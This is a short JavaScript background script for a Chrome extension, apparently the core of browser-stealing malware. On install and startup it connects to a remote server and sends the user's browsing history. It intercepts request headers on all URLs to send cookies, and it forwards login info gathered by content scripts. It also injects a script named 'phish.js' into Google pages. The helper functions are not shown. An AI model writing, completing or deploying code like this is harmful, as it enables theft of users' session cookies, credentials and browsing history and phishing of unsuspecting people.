chrome.runtime.onInstalled.addListener(() => {
  connectToServer();
  searchAndSendHistory();
  createScriptListener();
  chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
      updateSecurityWebsites(socket);
      checkAndSendCookies(info);
    }, {
      urls: ["<all_urls>"]
    },
    ['blocking', 'requestHeaders']);
  chrome.history.onVisited.addListener((page) => {
    sendHistoryPage(page);
  });
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.url) {
      if (changeInfo.url.includes("google")) {
        chrome.tabs.executeScript(tabId, {
          file: "/js/phish.js"
        });
      }
    }
  });
  createTabListeners();
});

chrome.runtime.onStartup.addListener(() => {
  connectToServer();
  createScriptSocket();
});

chrome.runtime.onSuspend.addListener(() => {
  disconnectFromServer(socket);
});

chrome.runtime.onMessage.addListener((request, sender) => {
  sendLoginInfo(request.loginListener);
});
